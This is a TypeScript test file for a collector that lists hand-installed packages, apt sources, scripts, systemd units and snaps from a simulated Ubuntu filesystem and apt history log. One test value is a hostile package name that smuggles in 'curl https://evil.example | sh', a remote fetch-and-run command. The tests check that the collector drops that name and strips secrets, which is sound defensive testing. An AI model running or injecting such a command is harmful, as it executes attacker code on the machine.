import { afterEach, expect, test } from 'bun:test'
import { collectSystem } from '../src/collectors/system'
import type { Item, RunResult } from '../src/types'
import { type Fixture, type FixtureOptions, makeHome, type Tree } from './fixture'

const PACKAGES_QUERY = 'dpkg-query -W -f ${Package}\\n'
const HOSTILE = 'x; curl https://evil.example | sh'
const PACKAGES = ['acme-cloud', 'libfoo', 'image-tool', 'widget-grep', 'newdep', 'acme-tools', HOSTILE, 'sh']

const HISTORY = [
  'Start-Date: 2000-01-01  10:00:00',
  'Commandline: apt-get install -y image-tool',
  'Install: image-tool:amd64 (1.0)',
  'End-Date: 2000-01-01  10:00:05',
  '',
  'Start-Date: 2099-01-01  10:00:00',
  'Commandline: apt-get install --assume-yes acme-cloud',
  'Install: acme-cloud:amd64 (2.90.0-1), libfoo:amd64 (1.2, automatic)',
  'End-Date: 2099-01-01  10:00:05',
  '',
  'Start-Date: 2099-01-02  10:00:00',
  'Commandline: apt install gone-tool',
  'Install: gone-tool:amd64 (1.0)',
  'End-Date: 2099-01-02  10:00:05',
  '',
  'Start-Date: 2099-01-03  10:00:00',
  'Commandline: apt install evil',
  `Install: ${HOSTILE}:amd64 (1.0)`,
  'End-Date: 2099-01-03  10:00:05',
  '',
  'Start-Date: 2099-01-04  10:00:00',
  'Commandline: apt-get upgrade',
  'Install: newdep:amd64 (1.0)',
  'End-Date: 2099-01-04  10:00:05',
  '',
].join('\n')

const ROTATED = [
  'Start-Date: 2099-01-05  10:00:00',
  'Commandline: aptitude install widget-grep',
  'Install: widget-grep:amd64 (14.1.0-1)',
  'End-Date: 2099-01-05  10:00:05',
  '',
].join('\n')

const SECRET_URL = 'https://user:tok3nSECRET@repo.example.test/apt?key=qSECRET'

const SYS: Tree = {
  '/sys/var/log/apt/history.log': HISTORY,
  '/sys/var/log/apt/history.log.2.gz': 'not compressed at all',
  '/sys/etc/os-release': 'NAME="Ubuntu"\nID=ubuntu\n',
  '/sys/etc/apt/sources.list.d/ubuntu.sources': 'Types: deb\nURIs: http://archive.ubuntu.test/ubuntu\n',
  '/sys/etc/apt/sources.list.d/acme.sources': `Types: deb\nURIs: ${SECRET_URL}\nSuites: stable\n`,
  '/sys/etc/apt/sources.list.d/widget.list':
    '# deb https://old.widget.test/debian stable main\ndeb [signed-by=/etc/apt/keyrings/widget.gpg] https://pkg.widget.test/debian stable main\n',
  '/sys/etc/apt/sources.list.d/vendor.list': 'deb https://vendor.test/debian stable main\n',
  '/sys/etc/apt/sources.list.d/notes.txt': 'not a source\n',
  '/sys/etc/apt/keyrings/widget.gpg': 'key bytes',
  '/sys/opt/acme/bin/acme': { text: '', exec: true },
  '/sys/opt/acme-tools/run': 'x',
  '/sys/opt/handmade/readme': 'x',
  '/sys/usr/local/bin/sync-notes': { text: '#!/bin/sh\necho hi\n', exec: true },
  '/sys/usr/local/bin/notes.txt': 'not executable',
  '/sys/usr/local/acme-cli/v2/current/bin/acme': { text: '\x7fELF rest', exec: true },
  '/sys/usr/local/bin/acme': { link: '/sys/usr/local/acme-cli/v2/current/bin/acme' },
  '/sys/usr/local/sbin/gone': { link: '/sys/usr/local/missing/bin/gone' },
  '/sys/usr/local/share/man/readme': 'x',
  '/sys/usr/local/tools/readme': 'x',
  '/sys/lib/systemd/system/gdm.service': '[Service]\nExecStart=/usr/sbin/gdm\n',
  '/sys/etc/systemd/system/backup.service': '[Service]\nExecStart=/usr/local/bin/sync-notes\n',
  '/sys/etc/systemd/system/multi-user.target.wants/backup.service': {
    link: '/sys/etc/systemd/system/backup.service',
  },
  '/sys/etc/systemd/system/display-manager.service': { link: '/sys/lib/systemd/system/gdm.service' },
  '/sys/etc/systemd/system/snap.acme-notes.daemon.service': '[Service]\nExecStart=/snap/bin/acme-notes\n',
  '/sys/etc/systemd/system/vendor.service': '[Service]\nExecStart=/usr/sbin/vendor\n',
  '/sys/var/lib/snapd/seed/seed.yaml': 'snaps:\n  - name: acme-browser\n    channel: stable\n    file: acme-browser_1.snap\n',
  '/sys/snap/bin/acme-notes': 'x',
  '/sys/snap/core22/current/readme': 'x',
  '/sys/snap/snapd/current/readme': 'x',
  '/sys/snap/acme-browser/current/readme': 'x',
  '/sys/snap/acme-notes/current/readme': 'x',
}

const OWNED = [
  '/opt/acme',
  '/etc/apt/sources.list.d/vendor.list',
  '/etc/systemd/system/vendor.service',
]

let fixture: Fixture | null = null

afterEach(async () => {
  await fixture?.cleanup()
  fixture = null
})

function answers(packages: string[] = PACKAGES): Record<string, RunResult> {
  const run: Record<string, RunResult> = {
    [PACKAGES_QUERY]: { code: 0, stdout: `${packages.join('\n')}\n` },
  }
  for (const path of OWNED) run[`dpkg -S ${path}`] = { code: 0, stdout: `owner: ${path}\n` }
  return run
}

// Builds the machine, then writes the rotated log: the fixture writes text only.
async function machine(options: FixtureOptions = { sys: SYS, run: answers() }): Promise<Fixture> {
  fixture = await makeHome({}, options)
  await Bun.write(fixture.place('/sys/var/log/apt/history.log.1.gz'), Bun.gzipSync(new TextEncoder().encode(ROTATED)))
  return fixture
}

function find(items: Item[], id: string): Item {
  const item = items.find((candidate) => candidate.id === id)
  if (item == null) throw new Error(`no item ${id}`)
  return item
}

test('a scan limited to the home reports nothing', async () => {
  const { ctx } = await machine()
  expect(await collectSystem({ ...ctx, root: null })).toEqual([])
})

test('without a package database nothing is reported', async () => {
  const { ctx } = await machine({ sys: SYS, run: {} })
  expect(await collectSystem(ctx)).toEqual([])
})

test('the machine gives exactly the hand-made items', async () => {
  const { ctx, home, sys } = await machine()
  const items = await collectSystem(ctx)
  const text = JSON.stringify(items)
  expect(text).not.toContain(sys)
  expect(text).not.toContain(home)
  const ids = items.map((item) => item.id).sort()
  expect(ids).toEqual([
    'binary:/usr/local/bin/acme',
    'binary:/usr/local/sbin/gone',
    'config:/etc/apt/keyrings/widget.gpg',
    'config:/etc/apt/sources.list.d/acme.sources',
    'config:/etc/apt/sources.list.d/widget.list',
    'dir:/opt/handmade',
    'dir:/usr/local/acme-cli',
    'dir:/usr/local/tools',
    'package:apt:acme-cloud',
    'package:apt:widget-grep',
    'package:snap:acme-notes',
    'script:/usr/local/bin/sync-notes',
    'service:/etc/systemd/system/backup.service',
  ])
})

test('apt packages come from explicit install commands made after the home', async () => {
  const { ctx } = await machine()
  const items = await collectSystem(ctx)
  expect(find(items, 'package:apt:acme-cloud')).toEqual({
    id: 'package:apt:acme-cloud',
    kind: 'package',
    category: 'manual',
    name: 'acme-cloud',
    detail: 'apt package',
    origin: 'apt:acme-cloud',
    fingerprint: '',
  })
  // From the rotated, compressed log.
  expect(find(items, 'package:apt:widget-grep').origin).toBe('apt:widget-grep')
  const ids = items.map((item) => item.id)
  // Automatic, installed while the image was built, removed since, and not from an install command.
  expect(ids).not.toContain('package:apt:libfoo')
  expect(ids).not.toContain('package:apt:image-tool')
  expect(ids).not.toContain('package:apt:gone-tool')
  expect(ids).not.toContain('package:apt:newdep')
  expect(ids).not.toContain('package:apt:sh')
  const text = JSON.stringify(items)
  expect(text).not.toContain('evil')
  expect(text).not.toContain('curl')
})

test('a package source added by hand shows its address without secrets', async () => {
  const { ctx } = await machine()
  const items = await collectSystem(ctx)
  const acme = find(items, 'config:/etc/apt/sources.list.d/acme.sources')
  expect(acme.kind).toBe('config')
  expect(acme.category).toBe('manual')
  expect(acme.name).toBe('acme.sources')
  expect(acme.path).toBe('/etc/apt/sources.list.d/acme.sources')
  expect(acme.detail).toBe('https://repo.example.test/apt')
  expect(acme.fingerprint).toMatch(/^[0-9a-f]{16}$/)
  expect(find(items, 'config:/etc/apt/sources.list.d/widget.list').detail).toBe('https://pkg.widget.test/debian')
  const key = find(items, 'config:/etc/apt/keyrings/widget.gpg')
  expect(key.detail).toBe('')
  expect(key.fingerprint).toMatch(/^[0-9a-f]{16}$/)
  expect(JSON.stringify(items)).not.toContain('SECRET')
})

test('the distribution source and a packaged source are not reported', async () => {
  const { ctx } = await machine()
  const ids = (await collectSystem(ctx)).map((item) => item.id)
  expect(ids).not.toContain('config:/etc/apt/sources.list.d/ubuntu.sources')
  expect(ids).not.toContain('config:/etc/apt/sources.list.d/vendor.list')
  expect(ids).not.toContain('config:/etc/apt/sources.list.d/notes.txt')
})

test('a hand-made directory in /opt is reported, packaged ones are not', async () => {
  const { ctx } = await machine()
  const items = await collectSystem(ctx)
  expect(find(items, 'dir:/opt/handmade')).toEqual({
    id: 'dir:/opt/handmade',
    kind: 'dir',
    category: 'manual',
    name: '/opt/handmade',
    detail: '',
    path: '/opt/handmade',
    fingerprint: '',
  })
  const ids = items.map((item) => item.id)
  expect(ids).not.toContain('dir:/opt/acme')
  expect(ids).not.toContain('dir:/opt/acme-tools')
})

test('/usr/local holds hand-made scripts, installer links and their directories', async () => {
  const { ctx } = await machine()
  const items = await collectSystem(ctx)
  const script = find(items, 'script:/usr/local/bin/sync-notes')
  expect(script.category).toBe('manual')
  expect(script.name).toBe('sync-notes')
  expect(script.detail).toBe('')
  expect(script.fingerprint).toMatch(/^[0-9a-f]{16}$/)

  const link = find(items, 'binary:/usr/local/bin/acme')
  expect(link.category).toBe('installed')
  expect(link.origin).toBe('installer:acme-cli')
  expect(link.detail).toBe('acme-cli installer')
  expect(link.fingerprint).toBe('')

  const dir = find(items, 'dir:/usr/local/acme-cli')
  expect(dir.category).toBe('installed')
  expect(dir.origin).toBe('installer:acme-cli')

  const tools = find(items, 'dir:/usr/local/tools')
  expect(tools.category).toBe('manual')
  expect(tools.origin).toBeUndefined()

  const gone = find(items, 'binary:/usr/local/sbin/gone')
  expect(gone.category).toBe('orphan')
  expect(gone.detail).toBe('link to /usr/local/missing/bin/gone, which is missing')
  expect(gone.fingerprint).toBe('/usr/local/missing/bin/gone')

  const ids = items.map((item) => item.id)
  expect(ids).not.toContain('dir:/usr/local/share')
  expect(ids.some((id) => id.includes('notes.txt'))).toBe(false)
})

test('a plain link in /usr/local/bin is manual and says where it points', async () => {
  const { ctx } = await machine({
    sys: {
      '/sys/usr/local/tools/run.sh': { text: '#!/bin/sh\n', exec: true },
      '/sys/usr/local/bin/run': { link: '/sys/usr/local/tools/run.sh' },
    },
    run: answers(),
  })
  const items = await collectSystem(ctx)
  const link = find(items, 'script:/usr/local/bin/run')
  expect(link.category).toBe('manual')
  expect(link.detail).toBe('link to /usr/local/tools/run.sh')
  expect(link.fingerprint).toMatch(/^[0-9a-f]{16}$/)
  expect(find(items, 'dir:/usr/local/tools').category).toBe('manual')
})

test('a hand-made system unit is reported, symlinks, snap and packaged units are not', async () => {
  const { ctx } = await machine()
  const items = await collectSystem(ctx)
  const unit = find(items, 'service:/etc/systemd/system/backup.service')
  expect(unit.category).toBe('manual')
  expect(unit.path).toBe('/etc/systemd/system/backup.service')
  expect(unit.detail).toBe('starts /usr/local/bin/sync-notes at boot')
  const ids = items.map((item) => item.id)
  expect(ids).not.toContain('service:/etc/systemd/system/display-manager.service')
  expect(ids).not.toContain('service:/etc/systemd/system/snap.acme-notes.daemon.service')
  expect(ids).not.toContain('service:/etc/systemd/system/vendor.service')
})

test('a snap installed by hand is reported, seeded and runtime snaps are not', async () => {
  const { ctx } = await machine()
  const items = await collectSystem(ctx)
  expect(find(items, 'package:snap:acme-notes')).toEqual({
    id: 'package:snap:acme-notes',
    kind: 'package',
    category: 'manual',
    name: 'acme-notes',
    detail: 'snap package',
    origin: 'snap:acme-notes',
    fingerprint: '',
  })
  const ids = items.map((item) => item.id)
  for (const name of ['acme-browser', 'core22', 'snapd', 'bin']) expect(ids).not.toContain(`package:snap:${name}`)
})

test('two scans of the same machine give the same items', async () => {
  const { ctx } = await machine()
  const first = await collectSystem(ctx)
  const second = await collectSystem(ctx)
  const order = (a: Item, b: Item) => (a.id < b.id ? -1 : 1)
  expect([...second].sort(order)).toEqual([...first].sort(order))
})

test('an install with an option that takes a value, and a log with Windows line endings, are read', async () => {
  const history = [
    'Start-Date: 2099-02-01  10:00:00',
    'Commandline: apt-get -t stable-backports install image-tool',
    'Install: image-tool:amd64 (1.0)',
    'End-Date: 2099-02-01  10:00:05',
    '',
    'Start-Date: 2099-02-02  10:00:00',
    'Commandline: apt install widget-grep',
    'Install: widget-grep:amd64 (14.1.0-1)',
    'End-Date: 2099-02-02  10:00:05',
    '',
  ].join('\r\n')
  const { ctx } = await machine({ sys: { '/sys/var/log/apt/history.log': history }, run: answers() })
  const ids = (await collectSystem(ctx)).map((item) => item.id)
  expect(ids).toContain('package:apt:image-tool')
  expect(ids).toContain('package:apt:widget-grep')
})

test('a rotated log that unpacks to more than the limit is skipped, not loaded', async () => {
  const { ctx, place } = await machine({ sys: { '/sys/var/log/apt/history.log': HISTORY }, run: answers() })
  await Bun.write(place('/sys/var/log/apt/history.log.3.gz'), Bun.gzipSync(new Uint8Array(70 * 1024 * 1024)))
  const ids = (await collectSystem(ctx)).map((item) => item.id)
  expect(ids).toContain('package:apt:acme-cloud')
  expect(ids).toContain('package:apt:widget-grep')
})

test('a snap with something to run is reported even when its name starts with "core"; a runtime that came along is not', async () => {
  const { ctx } = await machine({
    sys: {
      '/sys/snap/corectrl/current/meta/snap.yaml': 'name: corectrl\napps:\n  corectrl:\n    command: bin/run\n',
      '/sys/snap/theme-pack/current/meta/snap.yaml': 'name: theme-pack\nslots:\n  themes:\n    interface: content\n',
      '/sys/snap/core24/current/meta/snap.yaml': 'name: core24\ntype: base\n',
    },
    run: answers(),
  })
  const ids = (await collectSystem(ctx)).map((item) => item.id).filter((id) => id.startsWith('package:snap:'))
  expect(ids).toEqual(['package:snap:corectrl'])
})

test('a file in /usr/local or /opt is not reported as a directory', async () => {
  const { ctx } = await machine({
    sys: { '/sys/usr/local/README': 'notes\n', '/sys/opt/notes.txt': 'notes\n', '/sys/opt/handmade/run': 'x' },
    run: answers(),
  })
  const ids = (await collectSystem(ctx)).map((item) => item.id).filter((id) => !id.startsWith('package:'))
  expect(ids).toEqual(['dir:/opt/handmade'])
})
